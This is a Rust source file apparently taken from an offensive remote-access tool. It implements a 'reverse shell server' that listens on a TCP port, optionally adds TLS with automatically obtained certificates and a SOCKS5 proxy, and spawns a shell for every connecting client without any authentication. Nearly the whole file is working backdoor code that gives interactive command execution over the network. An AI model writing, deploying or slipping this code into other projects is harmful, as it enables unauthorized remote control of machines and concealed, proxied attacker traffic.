use crate::config::ReverseShellConfig;
use crate::certbot::CertBot;
use crate::socks5::MerinoManager;
use anyhow::{Context, Result};
use std::process::Stdio;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt, AsyncBufReadExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::process::Command;
use tokio_rustls::TlsAcceptor;
use tracing::{error, info, warn};

pub struct ReverseShellServer {
    config: ReverseShellConfig,
    merino: Option<MerinoManager>,
}

impl ReverseShellServer {
    pub fn new(config: ReverseShellConfig) -> Self {
        let merino = if config.socks5.enabled {
            Some(MerinoManager::new(config.socks5.clone()))
        } else {
            None
        };

        Self { config, merino }
    }

    pub async fn start(&mut self) -> Result<()> {
        info!("Starting Reverse Shell Server...");

        // Start SOCKS5 proxy if enabled
        if let Some(merino) = &mut self.merino {
            merino.start()?;
        }

        // Setup TLS if enabled
        let acceptor = if self.config.tls.enabled {
            info!("Setting up TLS...");
            let certbot = CertBot::new("certs")?;
            
            let domain = self.config.tls.domain.as_ref()
                .ok_or_else(|| anyhow::anyhow!("TLS domain not specified"))?;

            let _cert_info = certbot.ensure_certificate(
                domain,
                &self.config.tls.cert_path,
                &self.config.tls.key_path,
            )?;

            let tls_config = CertBot::load_tls_config(
                &self.config.tls.cert_path,
                &self.config.tls.key_path,
            )?;

            Some(TlsAcceptor::from(Arc::new(tls_config)))
        } else {
            None
        };

        // Bind server
        let bind_addr = format!("{}:{}", self.config.server.bind_address, self.config.server.port);
        let listener = TcpListener::bind(&bind_addr)
            .await
            .context("Failed to bind reverse shell server")?;

        info!("Reverse Shell Server listening on {}", bind_addr);
        info!("Waiting for reverse shell connections...");

        // Accept connections
        loop {
            let (stream, addr) = listener.accept().await?;
            info!("New reverse shell connection from: {}", addr);

            let config = self.config.clone();
            let acceptor = acceptor.clone();

            tokio::spawn(async move {
                if let Err(e) = Self::handle_shell(stream, config, acceptor).await {
                    error!("Error handling shell: {}", e);
                }
            });
        }
    }

    async fn handle_shell(
        stream: TcpStream,
        config: ReverseShellConfig,
        acceptor: Option<TlsAcceptor>,
    ) -> Result<()> {
        // Wrap in TLS if enabled
        if let Some(acceptor) = acceptor {
            let tls_stream = acceptor.accept(stream).await?;
            Self::process_shell(tls_stream, config).await
        } else {
            Self::process_shell(stream, config).await
        }
    }

    async fn process_shell<S>(mut stream: S, config: ReverseShellConfig) -> Result<()>
    where
        S: AsyncReadExt + AsyncWriteExt + Unpin + Send + 'static,
    {
        info!("Starting shell process: {}", config.shell.command);

        // Spawn shell process
        let mut child = Command::new(&config.shell.command)
            .args(&config.shell.args)
            .envs(config.shell.environment.iter().map(|e| (&e.key, &e.value)))
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .context("Failed to spawn shell process")?;

        let mut stdin = child.stdin.take().ok_or_else(|| anyhow::anyhow!("Failed to open stdin"))?;
        let stdout = child.stdout.take().ok_or_else(|| anyhow::anyhow!("Failed to open stdout"))?;
        let stderr = child.stderr.take().ok_or_else(|| anyhow::anyhow!("Failed to open stderr"))?;

        // Split stream
        let (mut read_half, mut write_half) = tokio::io::split(stream);

        // Task: Read from socket, write to shell stdin
        let input_task = tokio::spawn(async move {
            let mut buffer = vec![0u8; 4096];
            loop {
                match read_half.read(&mut buffer).await {
                    Ok(0) => break,
                    Ok(n) => {
                        if stdin.write_all(&buffer[..n]).await.is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // Task: Read from shell stdout, write to socket
        let stdout_task = tokio::spawn(async move {
            let mut reader = BufReader::new(stdout);
            let mut line = String::new();
            loop {
                match reader.read_line(&mut line).await {
                    Ok(0) => break,
                    Ok(_) => {
                        if write_half.write_all(line.as_bytes()).await.is_err() {
                            break;
                        }
                        line.clear();
                    }
                    Err(_) => break,
                }
            }
        });

        // Task: Read from shell stderr, write to socket
        let stderr_task = tokio::spawn(async move {
            let mut reader = BufReader::new(stderr);
            let mut buffer = vec![0u8; 4096];
            loop {
                match reader.read(&mut buffer).await {
                    Ok(0) => break,
                    Ok(_n) => {
                        // stderr output can be logged or sent separately
                    }
                    Err(_) => break,
                }
            }
        });

        // Wait for any task to complete
        tokio::select! {
            _ = input_task => {},
            _ = stdout_task => {},
            _ = stderr_task => {},
        }

        // Kill child process
        let _ = child.kill().await;
        info!("Shell session ended");

        Ok(())
    }
}
